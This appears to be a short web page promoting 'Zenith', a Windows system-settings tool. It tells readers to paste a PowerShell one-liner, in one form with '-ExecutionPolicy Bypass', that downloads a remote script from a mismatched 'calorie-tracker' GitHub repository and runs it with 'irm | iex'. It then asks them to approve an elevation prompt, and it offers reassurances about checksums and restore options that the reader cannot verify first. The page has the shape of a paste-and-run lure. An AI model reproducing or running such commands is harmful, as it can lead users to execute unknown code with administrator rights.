Install Zenith with one line of PowerShell

Paste this on your PC. It downloads Zenith, checks the download, and asks you three quick questions. No ZIP to unpack, no admin rights for the install.

>_Windows PowerShell–□×
PS C:\Users\you> irm https://raw.githubusercontent.com/jeffy22020-bot/calorie-tracker-fable-5-/HEAD/install.ps1 | iex

Open it from Start: type PowerShell, open Windows PowerShell, right-click to paste, then press Enter.

Prefer the Run box? Press Win + R, paste this, press Enter:
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/jeffy22020-bot/calorie-tracker-fable-5-/HEAD/install.ps1 | iex"

What happens

  1. Paste the line

    Zenith downloads (about 140 KB) and its SHA-256 checksum is checked, so a broken or altered download is never installed.

  2. Answer three prompts

    Install folder, desktop and Start menu shortcuts, start now. Pressing Enter accepts each default.

  3. Choose Yes

    Windows asks "Do you want to allow this app to make changes?". Zenith needs that to change system settings. Its window then opens.

Every change can be undone

Restore Original

One button in Zenith puts every setting back exactly as it was. The originals are saved before anything changes.

Windows restore point

Created automatically before the first change of every session, for a full system rollback.

Emergency Restore.bat

In the Zenith folder. Undoes everything from a console window, even if the app will not open.
